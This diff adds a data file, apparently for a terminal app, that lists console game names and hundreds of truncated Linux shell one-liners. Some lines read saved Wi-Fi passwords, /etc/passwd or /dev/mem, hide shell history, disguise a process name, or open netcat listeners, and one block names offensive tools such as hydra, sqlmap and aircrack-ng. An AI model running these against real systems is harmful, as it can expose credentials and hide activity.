@@ -1,0 +1,2631 @@
+adventure\n\n You are standing at the end of a road before a small brick buildin
+boggle\n\n +---+---+---+---+ 1:57\n | E | M | E | O |\n +---+---+---+---+\n | A
+backgammon\n\n _________________________\n |                       |\n |13  14
+atc\n \n 7-----------------------1\n | + . . . . . . . . . . |\n | . + . . . . .
+battlestar\n This is a luxurious stateroom. The floor is carpeted with a soft an
+worm\n\n ┌***************************┐\n *                           * \n *
+nethack-console\n\n What type of things do you want to take off?\n\n       a - A
+zangband\n\n Elf      .;;.....%..%.........\n Warrior  ..;;.....%.....%%...;\n R
+ninvaders\n\n  ,^,,^,,^,,^,,^,,^,,^,,^,,^,,\n  \n  _O-_O-_O-_O-   _O-_O-_O-_O-_\
+greed\n\n 46158478591614129875257576943\n 9372558327914     34335181291\n 679358
+moon-buggy\n\n                    Omm\n                 (\)-(\)\n #########  ###
+touch [fileName]
+echo $null >> [fileName]
+rm [fileName]
+cat > [filename]
+echo $null >> [filename]
+vi [fileName]
+nano [fileName]
+emacs [fileName]
+pico [fileName]
+ed [fileName]
+cp [fileName] [newFileName]
+cat [fileName] > [newFileName]
+dd if=[fileName] of=[newFileName]
+mv [fileName] [newFileName]
+mkdir [folderName]
+rm -r [folderName]
+ls
+dir
+cd [path]
+cd ~
+cd ..
+cd -
+pwd
+ln [fileOrigin] [linkDest]
+grep [phrase] [fileName]
+file -sL [partition]
+mount /dev/[device] [path]
+umount [path]
+chmod +x [file]
+du -h –max-depth=1
+watch -d -n 2 ‘df; ls -FlAt;’
+ls -l files ~/.local/share/Trash/files
+trash-list
+rm -r ~/.local/share/Trash
+gio trash --empty
+gvfs-trash --empty
+trash-empty
+gio trash [file]
+ls -l [file]
+chmod [permission] [file]
+ls -l [file]
+chown [user] [file]
+chgrp [group] [file]
+HZ=`awk '/\\#define HZ/ {print $3}' /usr/include/asm-generic/param.h`; NUMCPUS=`
+NUMCPUS=`grep ^proc /proc/cpuinfo | wc -l`; FIRST=`cat /proc/stat | awk '/^cpu /
+max=$(grep 'last full capacity:' /proc/acpi/battery/BAT1/info|awk '{print $4}')
+upower -i $(upower -e | grep BAT) | grep --color=never -E percentage|xargs|cut -
+cat /sys/class/power_supply/BAT1/uevent | awk '/POWER_SUPPLY_CAPACITY/ {print $1
+hciconfig -a | awk '/BD Address:/ {print $3}'
+hciconfig -a | awk '/Name:/ {print $2}'
+ifconfig -a
+cat /proc/meminfo
+cat /proc/version
+lspci
+lsusb
+lsblk
+curl ifconfig.me
+dig +short myip.opendns.com @resolver1.opendns.com
+netcat icanhazip.com 80 <<< $'GET / HTTP/1.1 Host: icanhazip.com  ' | tail -n1
+uptime
+df -k
+cat /var/log/boot.log
+cal
+gnome-screensaver-command -l
+dbus-send --type=method_call --dest=org.freedesktop.ScreenSaver /ScreenSaver org
+gnome-screensaver-command -a
+dbus-send --type=method_call --dest=org.freedesktop.ScreenSaver /ScreenSaver org
+reboot
+shutdown -r
+poweroff
+shutdown -h now
+reboot -p
+shutdown -h 18:45 "Server is going down for maintenance"
+service bluetooth stop
+service bluetooth start
+nmcli nm wifi off
+nmcli nm wifi on
+xset dpms force off
+import -window root [fileName]
+gnome-screenshot
+uvccapture -d/dev/video0 -oscreenURC.jpg -m
+spd-say "I am a robot"
+aplay /usr/share/sounds/alsa/Noise.wav
+play /usr/share/sounds/alsa/Noise.wav
+beep
+amixer set Master mute
+pactl set-sink-mute 0 1
+ffmpeg -f image2 -i image%d.jpg [fileName].mpg
+ffmpeg -i video.mpg image%d.jpg
+ffmpeg -i source_video.avi -vn -ar 44100 -ac 2 -ab 192k -f mp3 sound.mp3
+ffmpeg -i video_origine.mpg video_finale.avi
+ffmpeg -i video_origine.avi video_finale.mpg
+ffmpeg -i video_origine.avi -ab 56 -ar 44100 -b 200 -r 15 -s 320x240 -f flv vide
+ffmpeg -i video_origine.avi gif_anime.gif
+cat /etc/NetworkManager/system-connections/[SSID] | grep psk=
+lspci | egrep -i --color 'network|ethernet'
+ifconfig -a
+ip link show
+lshw -class network
+cat /proc/net/dev
+wget [url]
+curl -O [url]
+whois [ip]
+ping [ip]
+ifconfig
+hostname [ip]
+traceroute [ip]
+telnet [ip] [port]
+dig [ip]
+dhclient -r
+netstat -l
+lsof -i
+find / -iname "[query]"
+locate [query]
+which [command]
+whereis [command]
+history | grep [phrase]
+find / -mmin -60
+find / -cmin -60
+find / -atime 7
+grep [query] [file]
+find / -size +10M -size -100M
+groupadd [name]
+addgroup [name]
+groupdel [name]
+groupmod -n [newGroupname] [oldGroupname]
+useradd [name]
+adduser [name]
+userdel [name]
+deluser [name]
+usermod -l [newUsername] [oldUsername]
+passwd [name]
+usermod -a -G sudo [user]
+adduser [user] sudo
+finger [user]
+usermod -aG [groupName] [userName]
+adduser [userName] [groupName]
+gpasswd -a [userName] [groupName]
+useradd -G [group] [user]
+gpasswd -d [user] [group]
+deluser [user] [group]
+getent group
+cat /etc/group
+getent passwd
+cat /etc/passwd
+yersinia
+thc-ipv6
+sqlmap
+termineter
+searchsploit
+msfpc
+msfconsole
+beef-xss
+setoolkit
+cewl
+crunch
+hashcat
+john
+medusa
+ncrack
+ophcrack
+pyrit
+rcrack
+hydra
+autopsy
+binwalk
+bulk_extractor
+chkrootkit
+foremost
+galleta
+hashdeep
+volatility
+driftnet
+ettercap
+macchanger
+mitmproxy
+netsniff-ng
+wireshark
+dmitry
+ike-scan
+netdiscover
+nmap
+zenmap
+lynis
+nikto
+nmap
+httrack
+skipfish
+sqlmap
+mdb-sql
+sqlitebrowser
+sqlmap
+cewl
+aircrack-ng
+chirpw
+giskismet
+kismet
+mfoc
+mfterm
+reaver
+wifite
+cutycapt
+keepnote
+recordmydesktop
+snap install [packageName]
+flatpak install [remote] [packageName]
+apt install [packageName]
+yum install [packageName]
+dnf install [packageName]
+pkg install [packageName]
+apt-get install [packageName]
+pacman -S [packageName]
+pip install [packageName]
+zypper install [packageName]
+flatpak install [package.flatpakref]
+dpkg -i [package.deb]
+yum install [package.rpm]
+dnf install [package.rpm]
+pkg add [package.txz]
+pacman -U [package.tar.gz]
+pip install [/path/to/package]
+snap remove [packageName]
+apt-get remove [packageName]
+apt remove [packageName]
+dnf erase [packageName]
+pkg delete [packageName]
+pacman -R [packageName]
+pip uninstall [packageName]
+zypper rm [packageName]
+snap find [query]
+flatpak search [query]
+apt-cache search [query]
+apt search [query]
+yum search [query]
+dnf search [query]
+pkg search [query]
+pacman -Ss [query]
+pip search [query]
+zypper search [packageName]
+snap info [packageName]
+apt-cache show [packageName]
+apt show [packageName]
+dpkg -s [packageName]
+yum info [packageName]
+dnf info [packageName]
+pkg info [packageName]
+pacman -Si [packageName]
+pip show [packageName]
+apt-get update
+apt update
+yum check-update
+dnf check-update
+pkg update
+pacman -S
+zypper refresh
+snap refresh
+flatpak update
+apt-get upgrade
+apt upgrade
+yum update
+dnf upgrade
+pkg upgrade
+pacman -Syu
+pip install [packageName] --upgrade
+zypper update
+add-apt-repository ppa:[userName]/[ppaName]
+add-apt-repository deb [url] [derivative]
+yum-config-manager --add-repo [url]
+dnf config-manager --add-repo [url]
+zypper addrepo [url] [alias]
+sudo !!
+python -m SimpleHTTPServer
+^foo^bar
+ctrl-x e
+'ALT+.' or '<ESC> .'
+reset
+mount | column -t
+echo "ls -l" | at midnight
+curl ifconfig.me
+man ascii
+dig +short txt <keyword>.wp.dg.cx
+dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp
+<ctrl+u> [...] <ctrl+y>
+sshfs name@server:/path/to/folder /path/to/mount/point
+mount -t tmpfs tmpfs /mnt -o size=1024m
+wget --random-wait -r -p -e robots=off -U mozilla http://www.example.com
+ctrl-l
+curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuse
+ssh user@host cat /path/to/remotefile | diff /path/to/localfile -
+time read (ctrl-d to stop)
+ssh -t reachable_host ssh unreachable_host
+telnet towel.blinkenlights.nl
+less +F somelogfile
+disown -a && exit
+while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &
+net rpc shutdown -I ipAddressOfWindowsPC -U username%password
+history | awk '{a[$2]++}END{for(i in a){print a[i] " " i}}' | sort -rn | head
+ping -i 60 -a IP_address
+getconf LONG_BIT
+<alt> + <print screen/sys rq> + <R> - <S> - <E> - <I> - <U> - <B>
+echo "You can simulate on-screen typing just like in the movies" | pv -qL 10
+ps aux | sort -nk +4 | tail
+mv filename.{old,new}
+pushd /tmp
+\[command]
+some_very_long_and_complex_command # label
+lsof -i
+diff <(sort file1) <(sort file2)
+echo "!!" > foo.sh
+rm !(*.foo|*.bar|*.baz)
+lsof -P -i -n
+nc -v -l 80 < file.ext
+!*
+awk '/start_pattern/,/stop_pattern/' file.txt
+CDPATH=:..:~:~/projects
+echo "The date is: $(date +%D)"
+ifconfig | convert label:@- ip.png
+vim -x <FILENAME>
+man hier
+fuser -k filename
+awk '!x[$0]++' <file>
+find -not -empty -type f -printf "%s\n" | sort -rn | uniq -d | xargs -I{} -n1 fi
+python -m smtpd -n -c DebuggingServer localhost:1025
+!:-
+cat /etc/issue
+ssh-copy-id username@hostname
+wget -qO - "http://www.tarball.com/tarball.gz" | tar zxvf -
+ps aux | grep [p]rocess-name
+translate(){ wget -qO- "http://ajax.googleapis.com/ajax/services/language/transl
+tr -c "[:digit:]" " " < /dev/urandom | dd cbs=$COLUMNS conv=unblock | GREP_COLOR
+mplayer -ao pcm -vo null -vc dummy -dumpaudio -dumpfile <output-file> <input-fil
+ESC *
+cat ~/.ssh/id_rsa.pub | ssh user@machine "mkdir ~/.ssh; cat >> ~/.ssh/authorized
+rename 'y/ /_/' *
+dd if=/dev/mem | cat | strings
+readom dev=/dev/scd0 f=/path/to/image.iso
+strace -ff -e trace=write -e write=1,2 -p SOME_PID
+? () { echo "$*" | bc -l; }
+i="8uyxVmdaJ-w";mplayer -fs $(curl -s "http://www.youtube.com/get_video_info?&vi
+pv sourcefile > destfile
+ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's
+alias 'ps?'='ps ax | grep '
+fc
+git add -u
+mkdir /home/foo/doc/bar && cd $_
+man -t manpage | ps2pdf - filename.pdf
+rm -f !(survivior.txt)
+mkdir -p a/long/directory/path
+read day month year <<< $(date +'%d %m %y')
+ss -p
+vim scp://username@host//path/to/somefile
+^Z $bg $disown
+strings /dev/urandom | grep -o '[[:alnum:]]' | head -n 30 | tr -d '\n'; echo
+pv access.log | gzip > access.log.gz
+netstat -an | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort
+grep -RnisI <pattern> *
+ffmpeg -f x11grab -r 25 -s 800x600 -i :0.0 /tmp/outputFile.mpg
+date -d@1234567890
+watch -n 1 mysqladmin --user=<user> --password=<password> processlist
+notify-send ["<title>"] "<body>"
+for code in {0..255}; do echo -e "\e[38;05;${code}m $code: Test"; done
+gs -q -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile=OUTPUT.pdf -c .setpdfwrit
+curl -u username:password --silent "https://mail.google.com/mail/feed/atom" | tr
+cmdfu(){ curl "http://www.commandlinefu.com/commands/matching/$@/$(echo -n $@ |
+watch -t -n1 "date +%T|figlet"
+dpkg -S /usr/bin/ls
+dd if=/dev/zero of=/dev/null bs=1M count=32768
+mount /path/to/file.iso /mnt/cdrom -oloop
+du -s * | sort -n | tail
+ssh -MNf <user>@<host>
+ssh-keygen -R <the_offending_host>
+open .
+chmod --reference file1 file2
+ps awwfux | less -S
+ssh -t remote_host screen -r
+echo "rm -rf /unwanted-but-large/folder" | batch
+bind -P
+timeout 5s COMMAND
+cat /dev/urandom | hexdump -C | grep "ca fe"
+find . -type d -empty -delete
+cp file.txt{,.bak}
+sed -n 5p <file>
+ssh -t hostA ssh hostB
+tar -tf <file.tar.gz> | xargs rm -r
+% screen -r someuser/
+rtfm() { help $@ || man $@ || $BROWSER "http://www.google.com/search?q=$@"; }
+script -qf | tee >(nc -kl 5000) >(nc -kl 5001) >(nc -kl 5002)
+google docs edit --title "To-Do List" --editor vim
+diff <(lsof -p 1234) <(sleep 10; lsof -p 1234)
+touch /forcefsck
+curl wttr.in/seville
+until !!; do :; done
+date --set="$(ssh user@server date)"
+wget -q -U Mozilla -O output.mp3 "http://translate.google.com/translate_tts?ie=U
+ls -d */
+curl ifconfig.me
+lsof -i tcp:80
+du -b --max-depth 1 | sort -nr | perl -pe 's{([0-9]+)}{sprintf "%.1f%s", $1>=2**
+ssh root@remote.host "rpm -qa" | xargs yum -y install
+lsmod | perl -e 'print "digraph \"lsmod\" {";<>;while(<>){@_=split/\s+/; print "
+wget http://www.youtube.com/watch?v=dQw4w9WgXcQ -qO- | sed -n "/fmt_url_map/{s/[
+watch -n 1 'echo "obase=2;`date +%s`" | bc'
+leave +15
+wget -r -l1 --no-parent -nH -nd -P/tmp -A".gif,.jpg" http://example.com/images
+grep ^Dirty /proc/meminfo
+for I in $(mysql -e 'show databases' -s --skip-column-names); do mysqldump $I |
+:<C-R><C-W>
+mkdir -p work/{d1,d2}/{src,bin,bak}
+youtube-dl -t --extract-audio --audio-format mp3 YOUTUBE_URL_HERE
+cp /work/host/phone/ui/main.cpp !#$:s/host/target
+echo "tee can split a pipe in two"|tee >(rev) >(tr ' ' '_')
+dig +short myip.opendns.com @resolver1.opendns.com
+knock <host> 3000 4000 5000 && ssh -p <port> user@host && knock <host> 5000 4000
+diff <(cd dir1 && find | sort) <(cd dir2 && find | sort)
+export HISTTIMEFORMAT="%F %T "
+find . -name "*.[ch]" -exec grep -i -H "search pharse" {} \;
+find ./ -type f -exec chmod 644 {} \;
+find / -mmin 60 -type f
+showkey -a
+find . -type f -newermt "2010-01-01" ! -newermt "2010-06-01"
+ssh host -l user $(<cmd.txt)
+ccze
+mkfifo /tmp/fifo; cat /tmp/fifo | nc -l -p 1234 | tee -a to.log | nc machine por
+wget -qO - http://infiltrated.net/blacklisted|awk '!/#|[a-z]/&&/./{print "iptabl
+echo | openssl s_client -connect www.google.com:443 2>/dev/null |openssl x509 -d
+[enter]~?
+python -m http.server
+ls !(*.gz)
+lsof -P -i -n | cut -f 1 -d " "| uniq | tail -n +2
+grep --color=always | less -R
+echo $(sudo lshw -businfo | grep -B 1 -m 1 $(df "/path/to/file" | tail -1 | awk
+sed -i 8d ~/.ssh/known_hosts
+:w !sudo tee > /dev/null %
+ssh root@server.com 'tshark -f "port !22" -w -' | wireshark -k -i -
+md () { mkdir -p "$@" && cd "$@"; }
+awk '{$1=$3=""}1' file
+alias dush="du -sm *|sort -n|tail"
+tar --exclude-vcs -cf src.tar src/
+grep . filename > newfilename
+history -d
+kill -9 $$
+ssh -t user@some.domain.com /usr/bin/screen -xRR
+mysqldump --add-drop-table --extended-insert --force --log-error=error.log -uUSE
+echo ${SSH_CLIENT%% *}
+echo $[RANDOM%X+1]
+<ctrl+z> fg; notify_me
+:TOhtml
+arecord -f dat | ssh -C user@host aplay -f dat
+lshw -html > hardware.html
+:mksession! <filename>
+for file in `ls *.pdf`; do convert -verbose -colorspace RGB -resize 800 -interla
+bind -x '"\C-l":ls -l'
+find / -type f -size +500M
+pdftotext [file] - | grep 'YourPattern'
+yes | pv | ssh $host "cat > /dev/null"
+date -d @1234567890
+strings /dev/mem
+tidy -xml -i -m [file]
+ssh remotehost 'dpkg --get-selections' | dpkg --set-selections && dselect instal
+lsof -Pan -i tcp -i udp
+grep -Fx -f file1 file2
+alias head='head -n $((${LINES:-`tput lines 2>/dev/null||echo -n 12`} - 2))'
+apt-get install most && update-alternatives --set pager /usr/bin/most
+nl
+diff <(echo "$a") <(echo "$b")
+killall -STOP -m firefox
+lynx -accept_all_cookies -cmd_script=/your/keystroke-file
+svn log -q|grep "|"|awk "{print \$3}"|sort|uniq -c|sort -nr
+CTRL + T
+bc <<< 'obase=60;299'
+( command & )
+diff <(lsusb) <(sleep 3s && lsusb)
+DISPLAY=:0.0 import -window root /tmp/shot.png
+vi +/pattern [file]
+PROMPT_COMMAND='if [ $RANDOM -le 3200 ]; then printf "\0337\033[%d;%dH\033[4%dm
+tar -cf - . | pv -s $(du -sb . | awk '{print $1}') | gzip > out.tgz
+some_command > >(/bin/cmd_for_stdout) 2> >(/bin/cmd_for_stderr)
+( ( sleep 2h; your-command your-args ) & )
+cd !$:h
+perl -e 'print "P1\n256 256\n", map {$_&($_>>8)?1:0} (0..0xffff)' | display
+command | figlet
+lsof -c dhcpd
+curl -Is slashdot.org | egrep '^X-(F|B|L)' | cut -d \- -f 2
+$ grep -rl oldstring . |xargs sed -i -e 's/oldstring/newstring/'
+xset dpms force standby
+bash -x ./post_to_commandlinefu.sh
+netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c
+tar --create --file - --posix --gzip -- <dir> | openssl enc -e -aes256 -out <fil
+read -s pass; echo $pass | md5sum | base64 | cut -c -16
+file -s /dev/sd*
+rm *.txt <TAB> <TAB>
+<ESC> .
+xkcd(){ wget -qO- http://xkcd.com/|tee >(feh $(grep -Po '(?<=")http://imgs[^/]+/
+read -sn 1 -p "Press any key to continue..."
+clfavs(){ URL="http://www.commandlinefu.com";wget -O - --save-cookies c --post-d
+sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g"
+tar -cj /backup | cstream -t 777k | ssh host 'tar -xj -C /backup'
+./my-really-long-job.sh && notify-send "Job finished"
+sl
+stat -c '%A %a %n' *
+nc -l -p 2000 -c "nc example.org 3000"
+lynx -dump http://www.ip-adress.com/ip_tracer/?QRY=$1|grep address|egrep 'city|s
+man -t UNIX_COMMAND | open -f -a preview
+[[ test_condition ]] && if_true_do_this || otherwise_do_that
+ctrl-t
+find ~ -name '*.sqlite' -exec sqlite3 '{}' 'VACUUM;' \;
+column -tns: /etc/passwd
+script -t /tmp/mylog.out 2>/tmp/mylog.time; <do your work>; <CTRL-D>; scriptrepl
+bind '"\C-l":"ls -l\n"'
+cut -f5 --complement
+ls -Q
+dd if=/dev/sda | tee >(dd of=/dev/sdb) | dd of=/dev/sdc
+(echo CD_DA; for f in {01..99}; do echo "$f Hz">&2; sox -nt cdda -r44100 -c2 $f.
+bbcradio() { local s PS3="Select a station: ";select s in 1 1x 2 3 4 5 6 7 "Asia
+curl ip.appspot.com
+dpkg-query -Wf '${Installed-Size}\t${Package}\n' | sort -n
+nethogs -p eth0
+timeout 10 sleep 11
+echo "foo" > /dev/tcp/192.168.1.2/25
+svn diff | view -
+grep -lir "some text" *
+true && { echo success;} || { echo failed; }
+rsync --partial --progress --rsh=ssh  $file_source $user@$host:$destination_file
+sudo zcat /var/log/auth.log.*.gz | awk '/Failed password/&&!/for invalid user/{a
+some_command | tee >(command1) >(command2) >(command3) ... | command4
+tail -f file | while read; do echo "$(date +%T.%N) $REPLY"; done
+<COMMAND> |:
+ln -nsf <TARGET> <LINK>
+echo "GRUB_INIT_TUNE=\"1000 334 1 334 1 0 1 334 1 0 1 261 1 334 1 0 1 392 2 0 4
+fdupes -r .
+~.
+grep -a -B 25 -A 100 'some string in the file' /dev/sda1 > results.txt
+alias busy='my_file=$(find /usr/include -type f | sort -R | head -n 1); my_len=$
+rename 'y/A-Z/a-z/' *
+touch /tmp/file ; $EXECUTECOMMAND ; find /path -newer /tmp/file
+gnuplot -persist <(echo "plot '<(sort -n listOfNumbers.txt)' with lines")
+ffmpeg -vcodec copy -acodec copy -i orginalfile -ss 00:01:30 -t 0:0:20 newfile
+tail -10000 access_log | awk '{print $1}' | sort | uniq -c | sort -n | tail
+nocache <I/O-heavy-command>
+for i in ?.ogg; do mv $i 0$i; done
+sudo cpulimit -p pid -l 50
+shuf -n4 /usr/share/dict/words | tr -d '\n'
+ssh -f -L 5900:localhost:5900 your.ssh.server "x11vnc -safer -localhost -nopw -o
+diff <(wget -q -O - URL1) <(wget -q -O - URL2)
+nmap -sP 192.168.1.0/24
+ps hax -o user | sort | uniq -c
+alias dateh='date --help|sed -n "/^ *%%/,/^ *%Z/p"|while read l;do F=${l/% */};
+echo {1..199}" bottles of beer on the wall, cold bottle of beer, take one down,
+[ -t 0 ] || exit 1
+echo -e "\e[32m"; while :; do for i in {1..16}; do r="$(($RANDOM % 2))"; if [[ $
+/sbin/kexec -l /boot/$KERNEL --append="$KERNELPARAMTERS" --initrd=/boot/$INITRD;
+some command|xsel --clipboard
+ls -hog
+git rm $(git ls-files --deleted)
+sed '1000000!d;q' < massive-log-file.log
+(mountpoint -q "/media/mpdr1" && df /media/mpdr1/* > /dev/null 2>&1) || ((sudo u
+sudo tcpdump -i wlan0 -n ip | awk '{ print gensub(/(.*)\..*/,"\\1","g",$3), $4,
+getconf LONG_BIT
+ssh user@host "tar -zcf - /path/to/dir" > dir.tar.gz
+<ESC> v or ctrl-x ctrl-e
+wall <<< "Broadcast This"
+telnet towel.blinkenlights.nl 666
+echo "export DISPLAY=:0; export XAUTHORITY=~/.Xauthority; notify-send test" | at
+udevadm monitor
+bash-hotkey: <CTRL+x+e>
+pwdx pid
+echo "obase=2; 27" | bc -l
+set -o vi
+ssh-keygen; ssh-copy-id user@host; ssh user@host
+taskset -c 0 your_command
+rename 'y/A-Z/a-z/' *
+history | awk '{print $2}' | sort | uniq -c | sort -rn | head
+data:text/html, <html contenteditable>
+zdump Japan America/New_York
+dmesg -T|sed -e 's|\(^.*'`date +%Y`']\)\(.*\)|\x1b[0;34m\1\x1b[0m - \2|g'
+echo "This text gets stamped on the top of the pdf pages." | enscript -B -f Cour
+awk 'BEGIN{FS=":"; print "digraph{"}{split($4, a, ","); for (i in a) printf "\"%
+while true; do nc -l 7000 | tar -xvf -; done
+\foo
+mkfifo foo; script -f foo
+df -P | column -t
+mycommand 2> >(while read line; do echo -e "\e[01;31m$line\e[0m"; done)
+au BufWritePost * if getline(1) =~ "^#!" | if getline(1) =~ "/bin/" | silent !ch
+convert *.jpg output.pdf
+sudo dd if=/dev/sdc bs=4096 | pv -s 2G | sudo dd bs=4096 of=~/USB_BLACK_BACKUP.I
+:g/^$/d
+date +%V
+for db in $(mysql -e 'show databases' -s --skip-column-names); do mysqldump $db
+ncdu
+tr : '\n' <<<$PATH
+autossh -M50000 -t server.example.com 'screen -raAd mysession'
+diff -urp /originaldirectory /modifieddirectory
+find . -type f -print0|xargs -0 md5sum|sort|perl -ne 'chomp;$ph=$h;($h,$f)=split
+find -L /path/to/check -type l -delete
+cd ~/.mozilla/firefox/ && sqlite3 `cat profiles.ini | grep Path | awk -F= '{prin
+cat count.txt | awk '{ sum+=$1} END {print sum}'
+^A ?
+nmap -sT -p 80 -oG - 192.168.1.* | grep open
+curl ipinfo.io
+ncat -vlm 5 --ssl --chat 9876
+dig +short which.opendns.com txt @208.67.220.220
+sed -i <file> -re '<start>,<end>d'
+ffmpeg -i video.flv -vn -ar 44100 -ac 2 -ab 192k -f mp3 audio.mp3
+grep . *
+for i in ~/.adobe ~/.macromedia ; do ( rm $i/ -rf ; ln -s /dev/null $i ) ; done
+lsof -i -P | grep -i "listen"
+aptitude purge '~c'
+watch "netstat -plan|grep :80|awk {'print \$5'} | cut -d: -f 1 | sort | uniq -c
+echo -e "Some Text Line1\nSome Text Line 2" | convert -background none -density
+DISPLAY=":0.0" import -window root screenshot.png
+define(){ local y="$@";curl -sA"Opera" "http://www.google.com/search?q=define:${
+git log --format='%aN' | sort -u
+flight_status() { if [[ $# -eq 3 ]];then offset=$3; else offset=0; fi; curl "htt
+ssh -4 -C -c blowfish-cbc
+rename -v 's/.*[s,S](\d{2}).*[e,E](\d{2}).*\.avi/SHOWNAME\ S$1E$2.avi/' poorly.n
+column -s, -t <tmp.csv
+find ~/.mozilla/firefox/ -type f -name "*.sqlite" -exec sqlite3 {} VACUUM \;
+lsof -Pni4 | grep LISTEN
+find -type f -exec md5sum '{}' ';' | sort | uniq --all-repeated=separate -w 33 |
+tmpfile=$(mktemp) && echo -e 'startup_message off\nscreen -t top htop\nsplit\nfo
+PS1="\`if [ \$? = 0 ]; then echo \e[33\;40m\\\^\\\_\\\^\e[0m; else echo \e[36\;4
+wget $URL | htmldoc --webpage -f "$URL".pdf - ; xpdf "$URL".pdf &
+sudo dd if=/dev/zero of=/swapfile bs=1024 count=1024000;sudo mkswap /swapfile; s
+mv $1 $2 && ln -s $2/$(basename $1) $(dirname $1)
+yes '' | cat -n
+rsync --rsync-path 'sudo rsync' username@source:/folder/ /local/
+mysql --database=dbname -B -N -e "SHOW TABLES"  | awk '{print "ALTER TABLE", $1,
+tail -1000 /some/file | vim -
+ssh user@host cat /path/to/some/file | xclip
+nmap -sS -P0 -sV -O <target>
+find * -type d -exec mkdir /where/you/wantem/\{\} \;
+alias s='screen -X screen'; s top; s vi; s man ls;
+echo $((0x1fe)) $((033))
+man -t awk | ps2pdf - awk.pdf
+echo 'obase=60;299' | bc
+strace -ff -e trace=file my_command 2>&1 | perl -ne 's/^[^"]+"(([^\\"]|\\[\\"nt]
+cp httpd.conf{,.bk}
+find -L / -samefile /path/to/file -exec ls -ld {} +
+for h in `find /proc/*/fd -ilname "/tmp/Flash*" 2>/dev/null`; do ln -s "$h" `rea
+rsync --progress --partial --rsh="ssh -p 8322" --bwlimit=100 --ipv4 user@domain.
+echo "dear admin, please ban eribsskog" | wall
+echo 213.251.145.96 wikileaks.com >>/etc/hosts
+sudo -K
+printf "%`tput cols`s"|tr ' ' '#'
+wget -qO - http://example.com/path/to/blah.tar.gz | tar xzf -
+vimdiff scp://root@server-foo.com//etc/snmp/snmpd.conf scp://root@server-bar.com
+tar cf - <dir>|split -b<max_size>M - <name>.tar.
+chmod -R -x+X *
+env PS4=' ${BASH_SOURCE}:${LINENO}(${FUNCNAME[0]}) ' sh -x /etc/profile
+wget --reject html,htm --accept pdf,zip -rl1 url
+mount -t ntfs-3g -o ro,loop,uid=user,gid=group,umask=0007,fmask=0117,offset=0x$(
+cat /var/log/secure.log | awk '{print substr($0,0,12)}' | uniq -c | sort -nr | a
+yes "$(seq 232 255;seq 254 -1 233)" | while read i; do printf "\x1b[48;5;${i}m\n
+echo {0..1}{0..1}{0..1}{0..1}
+bind '"\e[24~"':"\"ps -elF;df -h;free -mt;netstat -lnpt;who -a\C-m"""
+tail -f FILE | perl -pe 's/KEYWORD/\e[1;31;43m$&\e[0m/g'
+unset HISTFILE
+clfu-seach <search words>
+startx -- `which Xvfb` :1 -screen 0 800x600x24 && DISPLAY=:1 x11vnc
+sudo firefox -install-global-extension /path/to/add-on
+CTRL+u
+echo -n 'text to be encrypted' | openssl md5
+RETURN~.
+ssh user@host 'mysqldump dbname | gzip' > /path/to/backups/db-backup-`date +%Y-%
+MAC=`(date; cat /proc/interrupts) | md5sum | sed -r 's/^(.{10}).*$/\1/; s/([0-9a
+find . -name "*.php" -exec iconv -f ISO-8859-1 -t UTF-8 {} -o ../newdir_utf8/{}
+curl -I www.commandlinefu.com
+git commit -m "$(curl -s http://whatthecommit.com/index.txt)";
+qrencode -s 7 -o qr-wifi.png "WIFI:S:$(zenity --entry --text="Network name (SSID
+arch
+vi scp://username@host//path/to/somefile
+namei -m $(pwd)
+shopt -s autocd
+exec -a "/sbin/getty 38400 tty7" your_cmd -erase_all_files
+ssh-keygen -R <thehost>
+fuser -v 80/tcp
+du -h /path | sort -h
+find . -type f -printf '%TY-%Tm-%Td %TT %p\n' | sort
+netstat -lantp | grep ESTABLISHED |awk '{print $5}' | awk -F: '{print $1}' | sor
+echo $0
+wget http://URL/FILE.tar.gz -O - | tar xfz -
+rename 's/\.jpe?g$/.jpg/i' *
+find ./ -name Thumbs.db -delete
+lsof +L1
+# dd if=/dev/mem bs=1k skip=768 count=256 2>/dev/null | strings -n 8
+xdg-open [path]
+!:1-3
+sudo lsof -u someuser -a +D /etc
+!!:[position]
+lftp -e "mirror -c" http://example.com/foobar/
+:w !curl -F "sprunge=<-" http://sprunge.us | xclip
+ssh root@host1 "cd /somedir/tocopy/ && tar -cf - ." | ssh root@host2 "cd /samedi
+for file in *.flac; do flac -cd "$file" | lame -q 0 --vbr-new -V 0 - "${file%.fl
+sudo apt-get -o Acquire::http::Dl-Limit=30 upgrade
+for n in E2 A2 D3 G3 B3 E4;do play -n synth 4 pluck $n repeat 2;done
+grep 'test' somefile | grep -vE '(error|critical|warning)'
+(some_command 2>&1 1>&3 | tee /path/to/errorlog ) 3>&1 1>&2 | tee /path/to/stdou
+awk 'length>72' file
+make -j 4
+svn ls -R | egrep -v -e "\/$" | xargs svn blame | awk '{print $2}' | sort | uniq
+awk '{print NR": "$0; for(i=1;i<=NF;++i)print "\t"i": "$i}'
+svn diff <file> | vim -R -
+ls | curl -F 'sprunge=<-' http://sprunge.us | xclip
+for k in `git branch|perl -pe s/^..//`;do echo -e `git show --pretty=format:"%Cg
+type -all command
+who -b
+egrep -v "^$|^[[:space:]]*#" /etc/some/file
+screen -d -m [<command>]
+detox -r -s utf_8 /path/to/old/win/files/dir
+mkdir -p doc/{text/,img/{wallpaper/,photos/}}
+ssh -fX <user>@<host> <program>
+:g!/\S/d
+lsof +p xxxx
+du --max-depth=1 | sort -r -n | awk '{split("k m g",v); s=1; while($1>1024){$1/=
+cd `pwd -P`
+wget --recursive  --page-requisites --convert-links www.moyagraphix.co.za
+find . -type d -name '.svn' -print0 | xargs -0 rm -rdf
+find . -type f | wc -l
+exec 5<>/dev/tcp/time.nist.gov/13; cat <&5 & cat >&5; exec 5>&-
+top -p $(pgrep -d , foo)
+ctrl+w
+lsmod | awk 'BEGIN{print "digraph{"}{split($4, a, ","); for (i in a) print $1, "
+echo "export LESS_TERMCAP_mb=$'\E[01;31m'" >> ~/.bashrc
+!ssh:p
+manswitch () { man $1 | less -p "^ +$2"; }
+compgen -c | sort -u > commands
+cd <directory>; touch ./-i
